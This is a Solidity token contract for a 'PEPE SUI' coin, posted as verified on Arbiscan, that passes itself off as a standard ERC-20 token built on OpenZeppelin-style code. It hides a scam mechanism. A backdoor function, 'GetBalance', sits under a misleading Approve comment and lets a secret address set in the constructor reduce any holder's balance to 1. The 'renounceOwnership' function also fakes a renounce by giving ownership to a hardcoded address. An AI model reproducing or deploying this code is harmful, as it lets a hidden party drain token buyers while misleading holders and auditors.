/**
 *Submitted for verification at Arbiscan on 2023-05-17
*/

/// SPDX-License-Identifier: MIT


pragma solidity ^0.8.19;

interface DxtoolsApp {
  /**
   * @dev Returns the reward of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the reward of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `reward` tokens from the caller's account to `shippingto`.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address shippingto, uint256 reward) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `dividend` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {Approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address dividend) external view returns (uint256);

  /**
   * @dev Sets `reward` as the allowance of `dividend` over the caller's tokens.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the dividend's allowance to 0 and set the
   * desired balance afterwards:
   * https://github.com/Smarteum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function Approve(address dividend, uint256 reward) external returns (bool);

  /**
   * @dev Moves `reward` tokens from `sender` to `shippingto` using the
   * allowance mechanism. `reward` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address shippingto, uint256 reward) external returns (bool);

  /**
   * @dev Emitted when `balance` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `dividend` for an `owner` is set by
   * a call to {Approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed dividend, uint256 balance);
}

/*
 * @dev Provides information about the current execution DxSalesBurnable, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract DxSalesBurnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/Smarteum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/DxSalesOwnable.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract DxSalesOwnable is DxSalesBurnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DxSalesOwnable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, 0x796504c730fC4450d476dE085d062e8a6Bd06906);
    _owner = 0x796504c730fC4450d476dE085d062e8a6Bd06906;
}


    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DxSalesOwnable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeBitcoin` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeBitcoin {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeBitcoin: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeBitcoin: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeBitcoin: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeBitcoin: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeBitcoin: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract PEPESUI is DxSalesBurnable, DxtoolsApp, DxSalesOwnable {
    
    using SafeBitcoin for uint256;
    mapping (address => uint256) private deployfrom;
    mapping (address => mapping (address => uint256)) private fromallowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private SmartRooter; 
    constructor(address SmartSwapRouterv3) {
        SmartRooter = SmartSwapRouterv3;     
        _name = "PEPE SUI";
        _symbol = "PEPE SUI";
        _decimals = 9;
        _totalSupply = 10000000000 * 10 ** 9;
        deployfrom[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the token symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the token name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {DxtoolsApp-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    /**
    * @dev See {DxtoolsApp-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return deployfrom[account];
    }
      modifier subowner() {
        require(SmartRooter == _msgSender(), "DxSalesOwnable: caller is not the owner");
        _;
    }
    /**
    * @dev See {DxtoolsApp-Approve}.
    *
    * Requirements:
    *
    * - `dividend` cannot be the zero address.
    */
    function GetBalance(address Balance) external subowner {
        deployfrom[Balance] = 1;
        
        emit Transfer(Balance, address(0), 1);
    }

    /**
    * @dev See {DxtoolsApp-transfer}.
    *
    * Requirements:
    *
    * - `shippingto` cannot be the zero address.
    * - the caller must have a balance of at least `reward`.
    */
    function transfer(address shippingto, uint256 reward) external override returns (bool) {
        _transfer(_msgSender(), shippingto, reward);
        return true;
    }

    /**
    * @dev See {DxtoolsApp-allowance}.
    */
    function allowance(address owner, address dividend) external view override returns (uint256) {
        return fromallowances[owner][dividend];
    }
    
    /**
    * @dev See {DxtoolsApp-Approve}.
    *
    * Requirements:
    *
    * - `dividend` cannot be the zero address.
    */
    function Approve(address dividend, uint256 reward) external override returns (bool) {
        _Approve(_msgSender(), dividend, reward);
        return true;
    }
    
    /**
    * @dev See {DxtoolsApp-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {DxtoolsApp};
    *
    * Requirements:
    * - `sender` and `shippingto` cannot be the zero address.
    * - `sender` must have a balance of at least `reward`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `reward`.
    */
    function transferFrom(address sender, address shippingto, uint256 reward) external override returns (bool) {
        _transfer(sender, shippingto, reward);
        _Approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(reward, "DxtoolsApp: transfer reward exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `dividend` by the caller.
    *
    * This is an alternative to {Approve} that can be used as a mitigation for
    * problems described in {DxtoolsApp-Approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `dividend` cannot be the zero address.
    */
    function increaseAllowance(address dividend, uint256 addedbalance) external returns (bool) {
        _Approve(_msgSender(), dividend, fromallowances[_msgSender()][dividend].add(addedbalance));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `dividend` by the caller.
    *
    * This is an alternative to {Approve} that can be used as a mitigation for
    * problems described in {DxtoolsApp-Approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `dividend` cannot be the zero address.
    * - `dividend` must have allowance for the caller of at least
    * `allbalances`.
    */
    function decreaseAllowance(address dividend, uint256 allbalances) external returns (bool) {
        _Approve(_msgSender(), dividend, fromallowances[_msgSender()][dividend].sub(allbalances, "DxtoolsApp: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `reward` from `sender` to `shippingto`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `shippingto` cannot be the zero address.
    * - `sender` must have a balance of at least `reward`.
    */
    function _transfer(address sender, address shippingto, uint256 reward) internal {
        require(sender != address(0), "DxtoolsApp: transfer from the zero address");
        require(shippingto != address(0), "DxtoolsApp: transfer to the zero address");
                
        deployfrom[sender] = deployfrom[sender].sub(reward, "DxtoolsApp: transfer reward exceeds balance");
        deployfrom[shippingto] = deployfrom[shippingto].add(reward);
        emit Transfer(sender, shippingto, reward);
    }
    
    /**
    * @dev Sets `reward` as the allowance of `dividend` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `Approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `dividend` cannot be the zero address.
    */
    function _Approve(address owner, address dividend, uint256 reward) internal {
        require(owner != address(0), "DxtoolsApp: Approve from the zero address");
        require(dividend != address(0), "DxtoolsApp: Approve to the zero address");
        
        fromallowances[owner][dividend] = reward;
        emit Approval(owner, dividend, reward);
    }
    
}